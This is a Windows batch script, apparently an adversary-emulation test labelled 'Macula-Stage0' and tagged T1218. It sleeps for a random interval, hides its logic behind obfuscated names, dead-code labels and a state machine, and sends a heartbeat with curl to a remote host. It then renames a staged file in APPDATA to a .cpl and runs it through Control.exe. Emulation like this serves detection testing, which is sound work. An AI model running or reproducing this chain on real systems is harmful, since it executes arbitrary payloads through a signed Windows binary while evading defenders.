@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET xzmqp=%APPDATA%\8916\9a384829
SET pqwmn=Macula-Stage0-8916
SET zxmqp=https://10.0.0.49
SET rjklmn=https://10.0.0.49/stage/2/icon.png?8916-7
SET agntnm=BALAM-S2BO
SET endpt=7
SET outfl=taskmgr.txt
SET simid=8916
SET logfl=%APPDATA%\!endpt!\macula-simulations.log

SET state=0
echo [!DATE! !TIME!][DEBUG][!agntnm!]: script_start>> "!logfl!" 2>nul
SET /A rdelay=%RANDOM% %% 10 + 10
echo [!DATE! !TIME!][DEBUG][!agntnm!]: delay_start=!rdelay!s>> "!logfl!" 2>nul
timeout /t !rdelay! /nobreak >nul

GOTO l_start

:l_dead1
REM Never reached dead code
SET fake=unused
GOTO l_end

:l_start
IF !state!==0 GOTO s_init
IF !state!==17 GOTO s_hbeat
IF !state!==42 GOTO s_rename
IF !state!==87 GOTO s_exec
IF !state!==99 GOTO l_end

:l_dead2
REM Unreachable block
EXIT

:s_init
SET next=17
echo [!DATE! !TIME!][DEBUG][!agntnm!]: init_complete>> "!logfl!" 2>nul
SET state=!next!
ping -n 8 127.0.0.1 >nul
GOTO l_start

:l_dead3
REM Fake cleanup
DEL /Q fake.txt

:s_hbeat
echo [!DATE! !TIME!][DEBUG][!agntnm!]: heartbeat_start>> "!logfl!" 2>nul
curl -k -s -o nul "!rjklmn!"
echo [!DATE! !TIME!][DEBUG][!agntnm!]: heartbeat_complete>> "!logfl!" 2>nul
SET state=42
CHOICE /C Y /N /D Y /T 12 >nul
GOTO l_start

:s_junk
REM More dead code
SET tmp=0

:s_rename
echo [!DATE! !TIME!][DEBUG][!agntnm!]: rename_start>> "!logfl!" 2>nul
REN "!xzmqp!\!outfl!" file.cpl
IF EXIST "!xzmqp!\file.cpl" (
    SET rename_res=1
    SET rename_err=
) ELSE (
    SET rename_res=0
    SET rename_err=rename_failed
)
echo [!DATE! !TIME!][DEBUG][!agntnm!]: rename_result=!rename_res!>> "!logfl!" 2>nul
SET state=87
timeout /t 7 /nobreak >nul
GOTO l_start

:l_dead4
REM Unused label
GOTO l_end

:s_exec
echo [!DATE! !TIME!][DEBUG][!agntnm!]: execution_start>> "!logfl!" 2>nul
Control.exe "!xzmqp!\file.cpl"
IF !ERRORLEVEL!==0 (
    SET exec_res=1
    SET exec_err=
) ELSE (
    SET exec_res=0
    SET exec_err=exitcode_!ERRORLEVEL!
)
echo [!DATE! !TIME!][DEBUG][!agntnm!]: execution_result=!exec_res!>> "!logfl!" 2>nul
echo [!DATE! !TIME!][!agntnm!]: !endpt!-!simid!-T1218|Signed Binary Proxy Execution=!exec_res!:!exec_err!>> "!logfl!" 2>nul
SET state=99
ping -n 5 127.0.0.1 >nul
GOTO l_start

:l_end
echo [!DATE! !TIME!][DEBUG][!agntnm!]: script_end>> "!logfl!" 2>nul
ENDLOCAL